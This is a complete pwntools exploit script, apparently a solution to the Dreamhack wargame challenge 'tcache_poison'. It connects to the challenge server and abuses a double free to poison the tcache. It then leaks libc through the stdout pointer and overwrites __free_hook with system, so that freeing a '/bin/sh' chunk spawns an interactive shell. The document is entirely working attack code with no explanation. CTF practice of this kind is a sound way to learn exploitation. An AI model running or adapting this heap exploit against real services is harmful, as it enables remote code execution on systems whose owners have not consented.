from pwn import *

p = remote('host3.dreamhack.games', 22907)
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

alloc(0x30, b'AAAA')
free()

edit(b'B'*8 + b'\x00')
free()

addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

alloc(0x30, b'BBBBBBBB')

_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1] 
alloc(0x30, _io_2_1_stdout_lsb) 

# Libc leak
print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

slog('libc_base', libc_base)
slog('free_hook', free_hook)

alloc(0x40, b'BBBB')
free()
edit(b'C'*8 + b'\x00')
free()

alloc(0x40, p64(free_hook))
alloc(0x40, b'DDDDDDDD')
alloc(0x40, p64(system))     
                             

alloc(0x40, b'/bin/sh\x00')   
free()                        
                                              
p.interactive()
